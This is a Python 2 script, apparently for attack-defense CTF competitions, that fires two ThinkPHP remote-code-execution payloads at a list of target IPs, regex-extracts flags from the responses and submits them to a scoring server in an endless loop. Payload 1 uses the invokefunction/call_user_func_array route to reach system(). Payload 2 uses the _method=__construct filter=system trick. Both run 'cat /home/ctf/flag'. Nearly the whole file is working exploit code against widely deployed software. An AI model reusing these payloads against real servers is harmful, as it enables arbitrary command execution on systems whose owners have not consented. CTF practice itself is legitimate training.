#coding:utf-8
import requests
import time
import re


'''
发送payload

'''
def send_payload(ip_list,port,payload_list):
	print "--------strart attack--------"
	flag_list = []
	for payload in payload_list:

		for ip in ip_list:
			try:
				res = requests.post(url='http://'+ip+port+payload['get'],headers=eval(payload['headers']),cookies=eval(payload['cookies']),data=eval(payload['post']),timeout=5)
				#print ip
			except Exception as e:
				print "[-] "+'ERROR :'+ ip + " 访问失败"				
			else:
				if payload.has_key('re_rule'):
					try:
						flag = re.search(payload['re_rule'],res.text).group(1)
						#print flag
					except Exception as e:
						print "[-] "+'ERROR :'+ ip +" 正则匹配失败"
																	
					else:
						
						flag_list.append(flag)
						print '[+] '+ip+" attacked success with payload "+payload["payload_id"]
						print "[+] "+flag
						


					
				else:
					flag_list.append(flag)
					print '[+] '+ip+" attacked success with payload "+payload["payload_id"]
					print "[+] "+flag

	print "--------end attack--------"
	return flag_list


'''
提交flag
'''
def submit_flag(flag_list,submit_server):
	print "--------strart submit flag--------"
	for flag in flag_list:
		try:
			post = submit_server["post_data"].replace('boogle',flag)
			res = requests.post(url =submit_server['url'],cookies=eval(submit_server["cookies"]),data=eval(post))

		except Exception as e:
			print  '[+] '+"访问提交平台失败"
			#print e
		else:
			if submit_server["success_flag"] in res.text :
				print '[+] '+flag+' submit success'
			else:
				print '[-] '+flag+' submit wrong'
	print "--------end submit flag--------"




#配置靶机ip，port
ip_list= ['192.168.111.139','127.0.0.1','192.168.111.139']
port = ':80/'

'''
配置payload并添加到payload_list
re_relu配置为获取响应包中匹配flag的正则，若无可删除re_rule

'''
payload_list = []
payload_1 = {
			"payload_id":"1",
			"get":"index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /home/ctf/flag",
			"headers":'{"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}',
			"cookies":'{"PHPSESSID":"u6tegh0fu6ug10p1ro80sa0u12"}',
			"post":'{}',
			"re_rule":r'(\w{32})\n'

			}

payload_2 = {
			"payload_id":"2",
			"get":"index.php/daili/login/index.html",
			"headers":'{"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}',
			"cookies":'{"PHPSESSID":"u6tegh0fu6ug10p1ro80sa0u12"}',
			"post":'{"_method": "__construct", "method": "get", "filter": "system", "boo": "cat /home/ctf/flag"}',
			"re_rule":r'\n(\w{32})\n',

			}

'''
配置提交flag平台
url
cookies
success_flag配置为提交成功返回字样
post_data中flag修改为提交时的参数
boogle值勿修改

'''

submit_server ={
	
	"url":"http://192.168.111.139/uploads/submit.php",
	"cookies":'{"session": ".eJwdj1FLwzAUhf-KXHzsQ5euoAUfJlnDCjdxM2lIdIy6VteYVHCMuo79d6NvB76PwzkXaNrQD1C8N_7YJdC3UOQJDF_DvoPiAjdvUICVH6nVZm6kyqxsvaWL0bjSI930NpQ9uuUk9Doy7jjZfHL6eOB6dUbKgwm1F9rkSM3chsohVQQnNSKLvrPBEJVxVkev8lYuMiRqQoYpTuYH5TLnUo2cVYHTg8eAE-r12ZDVTLDSCVb3Im6x8q8rMooPcE3gdOy-hybEA3C7exLP8uX1RNLZ3T60_-F-C9dfGZNP8Q.D3xrwA.1L38hfS0wUIrfUXZXN5mo0dHNQk"}',
	"success_flag":"success",
	"post_data":'{"flag":"boogle"}',
}

payload_list.append(payload_1)
payload_list.append(payload_2)




if __name__ == "__main__":
	t = 5  #设置一轮时间
	while(1):
		try:
			flag_list = send_payload(ip_list,port,payload_list)
			#flag_list=['e10adc3949ba59abbe56e057f20f883e','e10adc3949ba59abbe56e057f20f883e','123']
			submit_flag(flag_list,submit_server)
			
		except Exception as e:
			print '[-] '+"未知错误"
			pass
		else:
			time.sleep(t)
		